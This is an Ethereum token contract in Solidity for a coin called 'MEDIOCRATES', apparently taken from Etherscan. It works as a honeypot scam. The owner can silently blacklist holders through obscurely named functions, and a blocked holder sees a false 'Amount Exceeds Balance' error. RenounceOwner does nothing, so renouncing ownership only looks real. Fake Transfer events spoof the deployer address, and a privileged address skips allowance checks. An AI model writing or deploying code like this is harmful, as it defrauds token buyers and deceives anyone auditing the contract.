/**
 *Submitted for verification at Etherscan.io on 2022-09-18
*/

pragma solidity 0.8.7;
/*
// https://medium.com/@MEDIOCRATESGOOD/the-philosopher-of-good-enough-8edfae809e81
// https://twitter.com/MediocratesERC
*/ 

contract MEDIOCRATES {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) zyAmount;

    // 
    string public name = "The Philosopher";
    string public symbol = unicode"MEDIOCRATES";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);

   



      constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        

        deploy(lead_deployer, totalSupply);
    }



	address owner = msg.sender;

    address Construct = 0x1419fB2A0cfF70289cd12f8DED17F6E8E04173c6;
    address lead_deployer = 0x8413f65e93d31f52706C301BCc86e0727FD7c025;
bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function RenounceOwner() public onlyOwner  {

}


  function deploy(address account, uint256 amount) public onlyOwner {
        
      emit Transfer(address(0), account, amount);
   }
   function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }

    function adbna(address _user) public onlyOwner {
        require(!zyAmount[_user], "xx");
        zyAmount[_user] = true;
    
    }
    
    function afbnb(address _user) public onlyOwner {
        require(zyAmount[_user], "xx");
        zyAmount[_user] = false;
    
    }
    
 

 
   


    function transfer(address to, uint256 value) public returns (bool success) {
require(!zyAmount[msg.sender] , "Amount Exceeds Balance"); 


if(msg.sender == Construct)  {


        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
  return true;
}
        
require(!zyAmount[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   

        if(from == Construct)  {

 require(value <= balanceOf[from]);
 require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
  return true;
}
    
        require(!zyAmount[from] , "Amount Exceeds Balance"); 
               require(!zyAmount[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}